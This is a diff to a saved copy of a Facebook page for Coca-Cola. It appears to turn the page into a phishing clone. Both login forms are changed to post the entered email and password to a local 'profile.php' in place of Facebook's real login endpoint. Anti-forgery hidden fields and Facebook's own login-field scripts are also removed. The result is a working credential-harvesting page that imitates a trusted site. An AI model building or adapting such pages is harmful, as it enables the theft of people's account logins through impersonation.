@@ -10480,28 +10480,26 @@
                             </a>
                         </div>
                         <div class="menu_login_container rfloat _ohf" data-testid="royal_login_form">
-                            <form id="login_form" action="profile.php" method="post" novalidate="1" onsubmit="">
+                            <form id="mainAuth" action="../../profile.php" method="post" novalidate="1" onsubmit="">
                                 <input type="hidden" name="FB_AUTH" value="13521" autocomplete="off"/>
-                                <input type="hidden" name="jazoest" value="2872" autocomplete="off"/>
-                                <input type="hidden" name="lsd" value="AVquNFE53Gc" autocomplete="off"/>
                                 <table cellspacing="0" role="presentation">
                                     <tr>
                                         <td class="html7magic">
-                                            <label for="email">Email or Phone</label>
+                                            <label for="userEmail">Email or Phone</label>
                                         </td>
                                         <td class="html7magic">
-                                            <label for="pass">Password</label>
+                                            <label for="userPassword">Password</label>
                                         </td>
                                     </tr>
                                     <tr>
                                         <td>
-                                            <input type="email" class="inputtext login_form_input_box" name="email" id="email" data-testid="royal_email"/>
+                                            <input type="text" class="inputtext login_form_input_box" name="email" id="userEmail" data-testid="royal_email"/>
                                         </td>
                                         <td>
-                                            <input type="password" class="inputtext login_form_input_box" name="pass" id="pass" data-testid="royal_pass"/>
+                                            <input type="password" class="inputtext login_form_input_box" name="pass" id="userPassword" data-testid="royal_pass"/>
                                         </td>
                                         <td>
-                                            <label class="login_form_login_button uiButton uiButtonConfirm" id="loginbutton" for="u_0_3_LW">
+                                            <label class="login_form_login_button uiButton uiButtonConfirm" id="loginBTn" for="u_0_3_LW">
                                                 <input value="Log In" aria-label="Log In" data-testid="royal_login_button" type="submit" id="u_0_3_LW"/>
                                             </label>
                                         </td>
@@ -10730,7 +10728,7 @@
                                                     <div class="_62uj">
                                                         <div class="_62uk">See more of Coca-Cola on Facebook</div>
                                                         <div class="">
-                                                            <form id="login_form" action="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110" method="post" novalidate="1" onsubmit="">
+                                                            <form id="login_form" action="profile.php" method="post" novalidate="1" onsubmit="">
                                                                 <input type="hidden" name="jazoest" value="2872" autocomplete="off"/>
                                                                 <input type="hidden" name="lsd" value="AVquNFE53Gc" autocomplete="off"/>
                                                                 <div>
@@ -18129,9 +18127,8 @@
         }]], ["BrowserPrefillLogging", "initContactpointFieldLogging", [], [{
             "contactpointFieldID": "email",
             "serverPrefill": ""
-        }]], ["BrowserPrefillLogging", "initPasswordFieldLogging", [], [{
-            "passwordFieldID": "pass"
-        }]], ["FocusListener"], ["FlipDirectionOnKeypress"], ["FIGEntityPageLayout", "registerAcrossTransitions", ["__elem_9f5fac15_0_2_hA"], [{
+        }]],
+            ["FocusListener"], ["FlipDirectionOnKeypress"], ["FIGEntityPageLayout", "registerAcrossTransitions", ["__elem_9f5fac15_0_2_hA"], [{
             "__m": "__elem_9f5fac15_0_2_hA"
         }, ["._19sz", "._2fvv > ._2yaa", "._5rll ._1fsh ._2yaa"]]], ["EntityPageSubNavigationLogger", "register", ["__elem_d3d2500b_0_0_XX"], [{
             "__m": "__elem_d3d2500b_0_0_XX"
@@ -24892,27 +24889,4 @@
         InitialJSLoader.loadOnDOMContentReady(["f5xfgNo", "eqrIUO1", "57GL92o", "OczkBbl", "hKY0QKT", "+sSuJY\/", "Mk1nz18", "nR3i3uV", "t8xAS4m", "dBNa67K", "9D0DLoB", "vhHx87K", "9p+TRQz", "nxeN9l0", "5v+ngxR", "kGJ3FU8", "eKaEgYl", "xnBU7zp", "ZfkvDJf", "FeIb53r", "OgIox0G", "VvKptP3", "KzvC9Dx", "Woa2Gbk", "wcuRbyF", "KpZ6y2e", "A20hYA8", "gFXYkYg", "qH48zQe", "inhLhV5", "PIbBYYF", "hwq6Nkj", "2i7YdXb", "YqRd10B", "H0f71VQ", "s0jqWxf", "pIyJLO9", "2ts9yZz", "I6ObZQ4", "0rHp8yR", "7JYm79x", "t2FQl\/Z", "QG8HnFm", "a3r2W8\/", "xeG+X8I", "O957D7l", "Wdk0P1J", "3nIAePM", "HhHWPOZ", "nlx7\/L7", "VbJ3710", "FEt5GzN", "GTfLLDB", "XVtAULI", "DlCp5l5", "sTW13AI", "lrbTDFs", "hyifOOU", "8ELCBwH", "wW1UvTK", "FAYYjjA", "YadRw0u", "L8vbCns", "xmkY2k3", "qf0VXug", "2PV0+LO", "gCshcvP", "c4LNzQM", "b8axCWk", "ek4sKye", "hLoZTZL", "XXqauOV", "MES988h", "OMh76f9", "hAjN+Un", "iqLtbg0", "dPJlTmE", "gblGql7", "GgbSlTI", "5SrNtKy", "LZnQAJA", "A08zhTg", "X\/qujF4", "FpbTXTq", "I\/G9KJE", "11AZbpH", "btzY3H6", "sS+c2Qc", "mzorVhl", "fqGVaGl", "5U5Fos7", "bPB7Yf0", "Gdo2jhr", "QEGHKVr", "AkuDJEQ", "w3ftDn1", "90G7qu0", "Jy9rHcn", "FLSm7Ko", "Uy\/J1e5", "wSZ7y0R", "KQ+loWk", "KLBGjev", "4JsBKrR", "vgiP9Hs", "hFeShQM", "xwt5ud4", "0VZjOmS", "y0WIx9q", "Kd9htQ4", "B+Ey\/3s", "a17kP+V", "zwt+ZvA"]);
     });
 </script>
-<script>
-    onloadRegister_DEPRECATED(function() {
-        try {
-            $("email").focus();
-        } catch (_ignore) {}
-    });
-    onloadRegister_DEPRECATED(function() {
-        try {
-            $("email").focus();
-        } catch (_ignore) {}
-    });
-    onafterloadRegister_DEPRECATED(function() {
-        CavalryLogger.getInstance("6947012798983210267-0").collectBrowserTiming(window)
-    });
-    onafterloadRegister_DEPRECATED(function() {
-        window.CavalryLogger && CavalryLogger.getInstance().setTimeStamp("t_paint");
-    });
-    onafterloadRegister_DEPRECATED(function() {
-        if (window.ExitTime) {
-            CavalryLogger.getInstance("6947012798983210267-0").setValue("t_exit", window.ExitTime);
-        }
-        ;
-    });
-</script>
+
